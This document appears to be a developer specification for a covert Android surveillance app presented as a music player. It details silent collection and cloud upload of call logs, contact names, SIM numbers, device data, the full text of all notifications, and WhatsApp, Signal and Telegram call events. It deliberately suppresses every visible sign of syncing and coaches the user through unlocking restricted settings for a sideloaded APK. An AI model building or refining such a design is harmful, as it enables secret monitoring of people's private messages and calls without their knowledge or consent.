# 01 — Silent Background Sync, Notification Capture & App-Call Detection

This document specifies every piece of the **invisible telemetry engine**:
1. Device registration & persistent identity (`DeviceHelper`, `PreferencesHelper`, `ApiClient`).
2. Cellular call log reading & instant/periodic cloud upload (`CallLogHelper`, `CallLogObserver`, `CallStateReceiver`, `CallSyncWorker`, `BootReceiver`).
3. Passive notification capture & third-party VoIP app-call extraction (`NotificationCaptureService`, `AppCallDetector`).
4. **Silent Background Contract**: One-time permission flow with **zero foreground service notifications** and **zero Toast popups**.

---

## 1. Strict Silent Operation Rules

Compare explicitly against `ZezAndroid`:
- **Remove `btn_sync` button & manual sync Toasts**: `MainActivity` in Quacky had `btn_sync` calling `triggerManualSync()` with `"Syncing call logs with cloud..."` and `"Call logs synced successfully"` Toasts. In the Companion App, **never** display any sync button, snackbar, or toast for call/notification/app-call uploads.
- **No `"Ready for messages & calls"` Foreground Notification**: Do **NOT** create any persistent background service calling `startForeground()` except when **music is actively playing** (`MusicPlayerService`) or an **alarm is actively ringing** (`AlarmRingingService`).
- **Silent Failure Handling**: All `ApiClient` sync calls log to `android.util.Log` at most; failed uploads never display error dialogs or toasts to the user—they naturally retry on the next `CallSyncWorker` 15-minute cycle, phone state `IDLE`, or `CallLogObserver` change.

---

## 2. One-Time Permission & Restricted Settings Onboarding

Because `MainActivity` boots into YMusic without showing Call Logs, the user must still grant runtime permissions once so background capture works indefinitely afterward.

### Step A: Runtime Permissions Request (Once cleanly at first startup / if missing)
On `MainActivity.onCreate()`, check and batch-request runtime permissions if not already granted (wait only if not already prompted this launch):
- Required silently:
  - `Manifest.permission.READ_CALL_LOG`
  - `Manifest.permission.READ_PHONE_STATE`
  - `Manifest.permission.READ_CONTACTS` (improves fallback contact name lookup when `CACHED_NAME` in `CallLog` is null)
  - `Manifest.permission.POST_NOTIFICATIONS` (Android 13+ / API 33+ — needed **only** for YMusic media notification & Alarms)
  - Storage permissions depending on API level:
    - Android 14+ (`API >= 34`): `READ_MEDIA_IMAGES`, `READ_MEDIA_VIDEO`, `READ_MEDIA_AUDIO`, `READ_MEDIA_VISUAL_USER_SELECTED`
    - Android 13 (`API == 33`): `READ_MEDIA_IMAGES`, `READ_MEDIA_VIDEO`, `READ_MEDIA_AUDIO`
    - Android 8–12 (`API <= 32`): `READ_EXTERNAL_STORAGE`
- **Important**: As soon as `READ_CALL_LOG` is granted in `onRequestPermissionsResult()`:
  1. Call `((CompanionApplication) getApplication()).registerCallLogObserverIfPermitted()` immediately.
  2. Trigger initial background registration & call sync on a worker thread (`initDeviceAndSync()`).

### Step B: Android 13–16 Restricted Settings & `NotificationListenerService` Flow
Side-loaded APKs on Android 13+ have `"Notification Access"` greyed out (`Restricted Setting`) until unlocked in **App Info**. Exact tested dialog copy & buttons from `MainActivity.java` lines 1821–1850 (adapted cleanly for the Companion App):
- Guard with preference flag `has_prompted_notif_perm_v2` in `"zez_prefs"` (or `"companion_prefs"`), so the popup appears **at most once automatically**.
- If `!NotificationCaptureService.isPermissionGranted(this)` and `!alreadyPrompted`:
  - Show dialog titled `"Enable Notification Access"`:
    - Message:
      ```text
      Android requires unlocking 'Restricted Settings' first:

      Step 1: Tap '1. App Info' → Tap ⋮ (top-right menu) → 'Allow restricted settings'

      Step 2: Tap '2. Enable Access' → Turn Companion switch ON
      ```
    - Positive button `"1. App Info"`: opens `Settings.ACTION_APPLICATION_DETAILS_SETTINGS` with `Uri.parse("package:" + getPackageName())`.
    - Neutral button `"2. Enable Access"`: opens `Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS` (fallback `Settings.ACTION_SETTINGS`).
    - Negative button `"Later"`: dismisses cleanly; user can always re-trigger it manually from **Settings -> Notification Cloud Backup**.
- When `NotificationCaptureService.isPermissionGranted(this)` IS true (checked on `MainActivity.onResume()`):
  - Call `NotificationCaptureService.ensureServiceBound(this)` which invokes `NotificationListenerService.requestRebind(new ComponentName(context, NotificationCaptureService.class))` on API 24+ so Android immediately re-attaches the listener if OEM battery optimization detached it.

### OEM Battery Optimization Tip (Settings or Optional Onboarding Step)
Many Chinese OEMs (Vivo, Xiaomi/MIUI, Oppo/ColorOS, Samsung) kill background `ContentObserver` / `BroadcastReceiver` processes unless `"Battery Optimization -> Unrestricted"` is enabled. Keep `WorkManager` (`PeriodicWorkRequest` 15 min) + `BootReceiver` + `NotificationListenerService` (Android OS auto-binds `NotificationListenerService` in a privileged system-bound process!) as the primary always-alive anchor.

---

## 3. Device Identity, Preferences & HTTP Client

### 3.1 `PreferencesHelper.java`
Backed by `SharedPreferences` (`PREF_NAME = "zez_prefs"`):

| Constant / Method | Key | Purpose |
| :--- | :--- | :--- |
| `KEY_API_URL` | `"api_base_url"` | Active server URL override |
| `DEFAULT_API_URL` | — | `"https://zez-chat-backend.onrender.com"` |
| `EMULATOR_API_URL` | — | `"http://10.0.2.2:3000"` |
| `KEY_DEVICE_TOKEN` | `"device_token"` | Raw Bearer token issued by `/api/devices/register` |
| `KEY_DEVICE_ID` | `"device_id"` | UUID row ID in `public.devices` |
| `KEY_PERSISTENT_UUID` | `"persistent_uuid"` | Lazy-generated `UUID.randomUUID().toString()` stored locally forever |
| `KEY_LAST_SYNC` | `"last_sync_timestamp"` | Epoch ms of last successful call sync |
| `KEY_LAST_CALL_COUNT` | `"last_call_count"` | Integer count synced |

#### Emulator Auto-Detection (`getApiBaseUrl`)
Exact logic from `PreferencesHelper.java` lines 105–134:
1. Check `prefs.getString("api_base_url", "")`. If non-empty and not equal to `DEFAULT_API_URL` / `EMULATOR_API_URL`? Look closely at `PreferencesHelper.isEmulator()`:
   - If saved URL is blank: return `isEmulator() ? EMULATOR_API_URL : DEFAULT_API_URL`.
   - `isEmulator()` checks `Build.FINGERPRINT` (`generic`, `unknown`), `Build.MODEL` (`google_sdk`, `Emulator`, `Android SDK built for x86`), `Build.MANUFACTURER` (`Genymotion`), `Build.BRAND` + `Build.DEVICE` (`generic`), or `"google_sdk".equals(Build.PRODUCT)`.
   - Remember: when developing locally, a real phone on USB can use `adb reverse tcp:3000 tcp:3000` or save `http://<LAN_IP>:3000` via the 5-tap Server Config UI!

### 3.2 `DeviceHelper.java`
- `getAndroidId(Context)`: `Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID)` (falls back to `"unknown-android-id"` if null/empty).
- `getDeviceDetails(Context)`: returns a `JsonObject` structured identically to Quacky:
  - `device`: `{ deviceName, model, manufacturer, brand, product, device, hardware, board, host, androidId, persistentId }`
  - `operatingSystem`: `{ os: "Android", versionRelease, sdkInt, securityPatch }`
  - `application`: `{ packageName, appVersion, versionCode }`
  - `storage`: `{ internalTotalBytes, internalAvailableBytes, internalUsedBytes }` (via `StatFs(Environment.getDataDirectory().getPath())`)
  - `memory`: `{ totalRamBytes, availableRamBytes, lowMemory }` (via `ActivityManager.MemoryInfo`)
  - `network`: `{ networkType ("WiFi"/"Cellular"/"Ethernet"/"Offline"), isConnected }`

### 3.3 `ApiClient.java` (Networking, DNS Resilience, Registration & Sync)
Exact OkHttp configuration verified in `ApiClient.java`:
- **Timeouts**: `connectTimeout = 20s`, `readTimeout = 30s`, `writeTimeout = 30s`.
- **Custom DNS Resolver with Render Fallback**:
  - Attempts `Dns.SYSTEM.lookup(hostname)`.
  - Filters & puts **IPv4 addresses first** (critical on dual-stack mobile carriers with flaky IPv6).
  - Caches last resolved `List<InetAddress>` in an in-memory map.
  - If `Dns.SYSTEM.lookup` fails on Render (`hostname.contains("onrender.com")`), falls back to cached IPs or hardcoded Cloudflare/Render edge IPs: `216.24.57.18`, `216.24.57.16`.
- **`registerDeviceSync(Context)`**:
  - Builds JSON:
    - `ids: { androidId, persistentId }`
    - `deviceName`, `deviceModel`, `manufacturer`, `brand`, `platform: "Android"`, `osVersion`, `appVersion`
    - `deviceDetails`: from `DeviceHelper.getDeviceDetails(context)`
    - Also optionally include SIM phone number / carrier if `READ_PHONE_STATE` / `READ_PHONE_NUMBERS` is granted (best-effort wrapped in `try/catch SecurityException`).
  - `POST <baseUrl>/api/devices/register` -> saves `deviceId` and `token` to `PreferencesHelper`.
- **Auto-Registration & Re-Auth Retry**:
  - Before any authenticated sync (`syncCalls`, `syncNotifications`, `syncAppCalls`, `syncAlarms`), if `token == null || token.isEmpty()`, call `registerDeviceSync(context)` first.
  - If any authenticated endpoint returns HTTP `401`, clear cached token, call `registerDeviceSync(context)` to re-issue a fresh active token, and retry once!

---

## 4. Call Log Capture & Sync Pipeline

### 4.1 `CallLogItem.java`
Exact fields & `toJsonObject()`:
```java
public long id;
public String externalId;   // "android:" + id
public String phoneNumber;  // raw number, "" if null
public String name;         // contact name, "" if null
public String type;         // INCOMING | OUTGOING | MISSED | REJECTED | VOICEMAIL | BLOCKED | UNKNOWN
public long timestamp;      // CallLog.Calls.DATE (epoch ms)
public long duration;       // CallLog.Calls.DURATION (seconds)
```
`toJsonObject()` outputs `{ "externalId": ..., "phoneNumber": ..., "name": ..., "type": ..., "timestamp": ..., "duration": ... }`.

### 4.2 `CallLogHelper.java`
- Checks `ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED`. Returns empty list if missing.
- Queries `CallLog.Calls.CONTENT_URI` with projection:
  - `_ID`, `NUMBER`, `CACHED_NAME`, `TYPE`, `DATE`, `DURATION`
- Order: `CallLog.Calls.DATE + " DESC"`.
- Maps `CallLog.Calls` types:
  - `INCOMING_TYPE` -> `"INCOMING"`
  - `OUTGOING_TYPE` -> `"OUTGOING"`
  - `MISSED_TYPE` -> `"MISSED"`
  - `REJECTED_TYPE` -> `"REJECTED"`
  - `VOICEMAIL_TYPE` -> `"VOICEMAIL"`
  - `BLOCKED_TYPE` -> `"BLOCKED"`
  - default -> `"UNKNOWN"`
- Fallback contact lookup: if `CACHED_NAME` is empty and `READ_CONTACTS` is granted, query `ContactsContract.PhoneLookup.CONTENT_FILTER_URI` cleanly to populate `name`.

### 4.3 `ApiClient.syncCalls(Context, List<CallLogItem>)`
- Splits calls into chunks of **100 records** (`CHUNK_SIZE = 100`, safely below backend's `MAX_BATCH_SIZE = 500`).
- Payload per chunk (`POST /api/calls/sync`):
  - `calls`: `JsonArray` of `item.toJsonObject()`
  - On the **first chunk only (`i == 0`)**, also attach `deviceDetails: DeviceHelper.getDeviceDetails(context)` so the server refreshes storage/RAM/network/appVersion metadata in `public.devices`.
- Because `public.call_logs` enforces `ON CONFLICT (device_id, external_id_hash) DO NOTHING`, sending full history or recent records is **100% idempotent** and safe! Update `PreferencesHelper.setLastSync(System.currentTimeMillis(), totalSynced)` silently.

### 4.4 Four Triggers Ensuring Call Logs Never Miss an Entry
1. **`CallLogObserver` (`ContentObserver` on `CallLog.Calls.CONTENT_URI`)**:
   - Registered in `CompanionApplication` (and on permission grant in `MainActivity`).
   - Uses a `Handler(Looper.getMainLooper())` **1200ms debounce** (`postDelayed(syncRunnable, 1200)` after removing any pending callback) because Android writes a call row first and sometimes updates `CACHED_NAME`/`DURATION` milliseconds later.
   - Fires `CallSyncWorker.syncNowAsync(context)` **and** enqueues `CallSyncWorker.scheduleImmediateSync(context)` (for offline-queued retry if network drops).
2. **`CallStateReceiver` (`BroadcastReceiver` on `android.intent.action.PHONE_STATE`)**:
   - Reads `TelephonyManager.EXTRA_STATE`.
   - When `TelephonyManager.EXTRA_STATE_IDLE.equals(state)` (cellular call just ended):
     - Calls `goAsync()` or launches a 1500ms delayed background worker/thread so Android finishes writing the call record to `CallLog.Calls`, then calls `CallSyncWorker.syncNowAsync(context)` + `CallSyncWorker.scheduleImmediateSync(context)`.
3. **`BootReceiver` (`BroadcastReceiver` on `BOOT_COMPLETED`, `MY_PACKAGE_REPLACED`, `QUICKBOOT_POWERON`)**:
   - Calls `schedulePeriodicSync(context)`: enqueues `PeriodicWorkRequest` (`"ZezCallPeriodicSync"` / `"CompanionCallPeriodicSync"`) every **15 minutes** with `NetworkType.CONNECTED` constraint (`ExistingPeriodicWorkPolicy.KEEP`).
   - Triggers `CallSyncWorker.scheduleImmediateSync(context)` once on boot/app-update.
   - Calls `AlarmHelper.rescheduleAllAlarms(context)`.
   - Calls `NotificationCaptureService.ensureServiceBound(context)` if permission is granted.
4. **`CallSyncWorker` (`androidx.work.Worker`)**:
   - `doWork()` calls `performSync(getApplicationContext())`:
     1. Register/refresh device token if missing.
     2. Read `CallLogHelper.getAllCallLogs(context)` and upload via `ApiClient.syncCalls(context, calls)`.
     3. Sync local + backend alarms via `AlarmHelper.syncWithBackendSync(context)` (good bonus piggyback every 15 minutes so admin-created alarms arrive even when the user never opens Tab 2!).
     4. Return `Result.success()` (or `Result.retry()` if network fails).

---

## 5. Silent Notification Capture & Third-Party App Call Detection

### 5.1 `NotificationCaptureService` (`extends NotificationListenerService`)
Must behave **100% invisibly** (no local UI popups, no sound, no foreground notification).

#### Key Methods & Anti-Noise Deduplication
1. `isPermissionGranted(Context)`: checks `Settings.Secure.getString(context.getContentResolver(), "enabled_notification_listeners")` contains `context.getPackageName()`.
2. `ensureServiceBound(Context)`: on API 24+, calls `requestRebind(new ComponentName(context, NotificationCaptureService.class))`.
3. `onListenerConnected()`:
   - Calls `getActiveNotifications()` inside `try/catch` and posts a batch of currently sitting notifications so notifications received right before rebind are still captured.
4. `onNotificationPosted(StatusBarNotification sbn)`:
   - **Ignore self**: skip if `packageName.equals(getPackageName())`.
   - **Ignore system/background noise**: skip `"android"`, `"com.android.systemui"`, `"com.android.providers.downloads"`, `"com.google.android.gms"` (unless an app call package), and skip `FLAG_ONGOING_EVENT` notifications **UNLESS** `AppCallDetector.extractAppCall(context, sbn)` recognizes it as an active/ringing/ended VoIP call!
   - **Deduplication cache**: maintain a synchronized `HashMap<String, Long>` keyed by `packageName + "|" + postTime + "|" + title + "|" + content` (prune if > 200 entries; suppress identical post within 10 seconds to prevent progress-bar/typing updates spamming the API).
   - **Two-step extraction per `sbn`**:
     1. **App Call Check (`AppCallDetector.extractAppCall(this, sbn)`)**: if non-null, add to a queue and call `ApiClient.syncAppCalls(this, batch)` on a single-thread `ExecutorService`.
     2. **General Notification Extraction**:
        - Skip ongoing events (`(notification.flags & Notification.FLAG_ONGOING_EVENT) != 0`).
        - Resolve human-readable `appName` via `PackageManager.getApplicationLabel(getApplicationInfo(pkg, 0))`.
        - Extract rich text from `notification.extras`:
          - `title`: `EXTRA_TITLE` fallback `EXTRA_TITLE_BIG` fallback `"android.conversationTitle"`.
          - `content`: `EXTRA_BIG_TEXT` fallback `EXTRA_TEXT`, or join lines from `EXTRA_TEXT_LINES` (up to 5 lines), fallback `notification.tickerText`.
          - `subText`: `EXTRA_SUB_TEXT` fallback `EXTRA_INFO_TEXT`.
        - Skip if both `title` and `content` are empty.
        - Build JSON `{ packageName, appName, title, content, subText, postTime }` and post via `ApiClient.syncNotifications(this, singleOrBatchList)`.

### 5.2 `AppCallDetector.java`
Extracts VoIP call events from third-party messaging & meeting apps (WhatsApp, WhatsApp Business, Telegram, Instagram, Messenger, Google Meet/Duo, Snapchat, Discord, Skype, Teams, Signal, Viber, Truecaller).

#### Tracked Packages Map (`CALL_PACKAGES`)
- `com.whatsapp` -> `"WhatsApp"`
- `com.whatsapp.w4b` -> `"WhatsApp Business"`
- `org.telegram.messenger` / `org.telegram.plus` -> `"Telegram"`
- `com.instagram.android` -> `"Instagram"`
- `com.facebook.orca` -> `"Messenger"`
- `com.google.android.apps.tachyon` / `com.google.android.apps.meetings` -> `"Google Meet"`
- `com.snapchat.android` -> `"Snapchat"`
- `com.discord` -> `"Discord"`
- `com.viber.voip` -> `"Viber"`
- `org.thoughtcrime.securesms` -> `"Signal"`

#### Detection Rules (`extractAppCall(Context, StatusBarNotification)`)
1. Check if `notification.category` is `Notification.CATEGORY_CALL` or `Notification.CATEGORY_MISSED_CALL`, **OR** if package is in `CALL_PACKAGES` and notification text/extras indicate a call.
2. **Video vs Voice**: inspect `extras.getBoolean("android.callIsVideo", false)` or match keywords (`"video call"`, `"video chat"` -> `"video"`, else `"voice"`).
3. **Direction (`callDirection`)**:
   - `"missed"`: category is `CATEGORY_MISSED_CALL` OR text contains `"missed"`.
   - `"outgoing"`: `extras.getInt("android.callType", -1) == 2` OR text contains `"calling"`, `"dialing"`, `"ringing"`, `"outgoing"`.
   - `"incoming"`: `extras.getInt("android.callType", -1) == 1` OR text contains `"incoming"`, `"answer"`, `"decline"`, `"is calling"`.
   - `"ended"`: text contains `"ended"`, `"duration"`, `"call ended"`.
4. **Caller Name**:
   - Check `"android.callPerson"` (`Person.getName()` on API 28+ or Bundle `"name"`), fallback `"android.conversationTitle"`, fallback `EXTRA_TITLE` (stripping suffixes like `" - Incoming call"`).
5. **Deduplication on Client**:
   - Suppress duplicate events for `(packageName + "|" + callerName + "|" + callDirection)` within a **4000ms window** so pulsing incoming call notifications do not upload multiple rows for the same ring.
6. Return `AppCallLogItem` -> uploaded to `POST /api/devices/app-calls/sync`.

---

## 6. Optional Remote Control Toggle Architecture (Recommended Enhancement)

If you later want the Admin Panel or remote config to pause/resume Call Sync or Notification Sync per device without pushing a new APK:
- The backend `GET /api/devices/config` (optional endpoint you can add cleanly) or the response of `POST /api/devices/register` / `POST /api/calls/sync` can return:
  ```json
  { "syncCallsEnabled": true, "syncNotificationsEnabled": true, "syncAppCallsEnabled": true }
  ```
- Client can store those booleans in `PreferencesHelper` (defaulting to `true`), and `CallSyncWorker` / `NotificationCaptureService` check those flags before querying/uploading. Zero UI changes required on Android!
